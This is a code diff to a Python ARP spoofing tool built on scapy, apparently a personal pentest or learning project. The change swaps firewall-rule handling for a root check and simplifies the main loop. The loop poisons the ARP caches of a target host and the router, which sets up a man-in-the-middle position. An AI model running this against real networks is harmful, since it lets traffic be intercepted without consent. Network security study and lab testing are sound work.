@@ -6,7 +6,7 @@ import argparse
 import scapy.all as scapy
 from colorama import Fore
 from modules.my_utils import show_message
-from modules.sys_utils import enable_rules, disable_rules
+from modules.sys_utils import check_root
 from modules.net_utils import get_gateway, get_own_mac, get_mac
 from modules.exit_handler import setup_signal_handler
 
@@ -26,24 +26,19 @@ def spoof(ip_address, spoof_ip, my_mac, victim_mac):
 ### Main Code #######################################################################################################################
 
 def main():
-    try:
-        setup_signal_handler(disable_rules)
-        show_message("Executing:", "info", "Arp Spoof")
-        arguments = get_arguments()
+
+    check_root()
+    setup_signal_handler()
+    show_message("Executing:", "info", "Arp Spoof")
+    arguments = get_arguments()
         
-        router_ip = get_gateway()
-        my_mac = get_own_mac(arguments.interface)  # Passar la interfície correctament
-        victim_mac = get_mac(arguments.target)
+    router_ip = get_gateway()
+    my_mac = get_own_mac(arguments.interface)  # Passar la interfície correctament
+    victim_mac = get_mac(arguments.target)
 
-        enable_rules()
-
-        while True:
-            spoof(arguments.target, router_ip, my_mac, victim_mac)
-            spoof(router_ip, arguments.target, my_mac, victim_mac)
-
-    except PermissionError:
-        show_message("You need to be SuperUser to perform this script", "error")
-        sys.exit(1)
+    while True:
+        spoof(arguments.target, router_ip, my_mac, victim_mac)
+        spoof(router_ip, arguments.target, my_mac, victim_mac)
 
 if __name__ == "__main__":
     main()
